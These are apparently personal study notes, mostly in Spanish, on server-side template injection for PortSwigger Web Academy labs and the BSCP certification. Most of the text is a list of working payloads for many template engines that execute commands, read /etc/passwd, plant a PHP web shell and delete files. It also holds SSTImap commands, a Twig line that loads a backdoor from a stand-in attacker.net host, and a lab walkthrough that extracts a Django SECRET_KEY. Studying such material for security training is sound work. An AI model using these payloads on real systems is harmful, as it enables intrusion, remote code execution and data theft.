![imagen](https://github.com/KrakenEU/BSCP/assets/80364768/04ebf58a-e6c7-463e-9593-126d84ad57c8)
- Siempre intentaremos causar un error escribiendo cualquier cosa en la zona de la plantilla o similares para ver si el error nos devuelve la version / engine que se utiliza en la plantilla, y luego ya...

--> PAYLOADS:
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#twig---code-execution
--> URL-ENCODER:
[https://www.urlencoder.org/]
## Polyglot SSTi !!!

In most cases, this polyglot payload will trigger an error in presence of a SSTI vulnerability:

```powershell
${{<%[%'"}}%\.
```
### SSTI Identified

> SSTI can be _**identified**_ using the tool [SSTImap](https://github.com/vladko312/SSTImap). The limitations of this tool is that the template expression `{{7*7}}` results are sometimes only evaluated by another GET request or calling another function in the application, as the **output** is not directly reflected or echoed into the response where the template expression was posted.  
> Alternative way to _**identify**_ the template framework is to induce error message by injecting malformed user supplied payloads.

Esta tool, la tengo en mi directorio principal /Users/juanfelipeoz/ y la puedo activar el entorno virtual con `source venv/bin/activate;`

Dejo la url igualmente pa ver los commands de ejemplo: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection

[Tib3rius give great SSTI explanation on this PortSwigger Web Academy labs tutorial](https://youtu.be/p6ElHfcnlSw)

```shell
python3 sstimap.py --engine erb -u https://TARGET.net/?message=Unfortunately%20this%20product%20is%20out%20of%20stock --os-cmd "cat /home/carlos/secret"
```

> POST request with the data param to test and send payload using SSTImap tool.

```shell
python3 sstimap.py -u https://TARGET.net/product/template?productId=1 --cookie 'session=StolenUserCookie' --method POST --marker fuzzer --data 'csrf=ValidCSRFToken&template=fuzzer&template-action=preview' --engine Freemarker --os-cmd 'cat /home/carlos/secret'
```

![[Pasted image 20260810210927.png]]

---

Simple:
```
{{7*7}}
${7*7}
<%= 7*7 %>
${{7*7}}
#{7*7}
```

SomePayloads:
```
Read File --- 

<%= system('cat /etc/passwd') %>

CerrarQuery+ConcatenarOtra --- 
user.first_name}}{%import os%}{{os.system('cat /etc/passwd')}}
```


Use the intruder to test payloads
check errors and move forward, search for exploits, etc.
```
Polyglot:
${{<%[%'"}}%\

FreeMarker (Java):
${7*7} = 49
<#assign command="freemarker.template.utility.Execute"?new()> ${ command("cat /etc/passwd") }

(Java):
${7*7}
${{7*7}}
${class.getClassLoader()}
${class.getResource("").getPath()}
${class.getResource("../../../../../index.htm").getContent()}
${T(java.lang.System).getenv()}
${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/etc/passwd').toURL().openStream().readAllBytes()?join(" ")}

Twig (PHP):
{{7*7}}
{{7*'7'}}
{{dump(app)}}
{{app.request.server.all|join(',')}}
"{{'/etc/passwd'|file_excerpt(1,30)}}"@
{{_self.env.setCache("ftp://attacker.net:2121")}}{{_self.env.loadTemplate("backdoor")}}

Smarty (PHP):
{$smarty.version}
{php}echo `id`;{/php}
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}

Handlebars (NodeJS):
wrtz{{#with "s" as |string|}}
{{#with "e"}}
{{#with split as |conslist|}}
{{this.pop}}
{{this.push (lookup string.sub "constructor")}}
{{this.pop}}
{{#with string.split as |codelist|}}
{{this.pop}}
{{this.push "return require('child_process').exec('whoami');"}}
{{this.pop}}
{{#each conslist}}
{{#with (string.sub.apply 0 codelist)}}
{{this}}
{{/with}}
{{/each}}
{{/with}}
{{/with}}
{{/with}}
{{/with}}

Velocity:
#set($str=$class.inspect("java.lang.String").type)
#set($chr=$class.inspect("java.lang.Character").type)
#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("whoami"))
$ex.waitFor()
#set($out=$ex.getInputStream())
#foreach($i in [1..$out.available()])
$str.valueOf($chr.toChars($out.read()))
#end

ERB (Ruby):
<%= system("whoami") %>
<%= Dir.entries('/') %>
<%= File.open('/example/arbitrary-file').read %>
<%= system('cat /etc/passwd') %>

Django Tricks (Python):
{% debug %}
{{settings.SECRET_KEY}}

Tornado (Python):
{% import foobar %} = Error
{% import os %}{{os.system('whoami')}}

Mojolicious (Perl):
<%= perl code %>
<% perl code %>

Flask/Jinja2: Identify:
{{ '7'*7 }}
{{ [].class.base.subclasses() }} # get all classes
{{''.class.mro()[1].subclasses()}}
{%for c in [1,2,3] %}{{c,c,c}}{% endfor %}

Flask/Jinja2: 
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}

Jade:
#{root.process.mainModule.require('child_process').spawnSync('cat', ['/etc/passwd']).stdout}

Razor (.Net):
@(1+2)
@{// C# code}
```
ERB
```
<%= system('cat /etc/passwd') %>
```

---------- lab stuff
##### # Basic server-side template injection (code context)
https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection
Tornado (Python)
```
{% import foobar %} = Error
{% import os %}

{% import os %}
{{os.system('whoami')}}
```


##### # Server-side template injection using documentation
${} = freemarker
```
<#assign ex="freemarker.template.utility.Execute"?new()> 
{ ex("id") }
```

##### Server-side template injection in an unknown language with a documented exploit
Experiment by injecting a fuzz string containing tem![[Pasted image 20240112131649.png]]plate syntax from various different template languages, such as `${{<%[%'"}}%\`, into the `message` parameter. Notice that when you submit invalid syntax, an error message is shown in the output. This identifies that the website is using Handlebars.
https://mahmoudsec.blogspot.com/2019/04/handlebars-template-injection-and-rce.html
```
wrtz{{#with "s" as |string|}} 
	{{#with "e"}} 
		{{#with split as |conslist|}} 
			{{this.pop}} 
			{{this.push (lookup string.sub "constructor")}} 
			{{this.pop}} 
				{{#with string.split as |codelist|}} 
				{{this.pop}} 
				{{this.push "return require('child_process').exec('rm /home/carlos/morale.txt');"}} 
				{{this.pop}} 
				{{#each conslist}} 
					{{#with (string.sub.apply 0 codelist)}} 
						{{this}} 
					{{/with}} 
				{{/each}} 
			{{/with}} 
		{{/with}} 
	{{/with}} 
{{/with}}
```
 URL encode it and paste it in ?message=

##### Server-side template injection with information disclosure via user-supplied objects
1. Log in and edit one of the product description templates.
2. Change one of the template expressions to something invalid, such as a fuzz string `${{<%[%'"}}%\`, and save the template. The error message in the output hints that the Django framework is being used.
3. Study the Django documentation and notice that the built-in template tag `debug` can be called to display debugging information.
4. In the template, remove your invalid syntax and enter the following statement to invoke the `debug` built-in:
5. `{% debug %}`
6. Save the template. The output will contain a list of objects and properties to which you have access from within this template. Crucially, notice that you can access the `settings` object.
7. Study the `settings` object in the Django documentation and notice that it contains a `SECRET_KEY` property, which has dangerous security implications if known to an attacker.
8. In the template, remove the `{% debug %}` statement and enter the expression `{{settings.SECRET_KEY}}`
9. Save the template to output the framework's secret key.
10. Click the "Submit solution" button and submit the secret key to solve the lab.
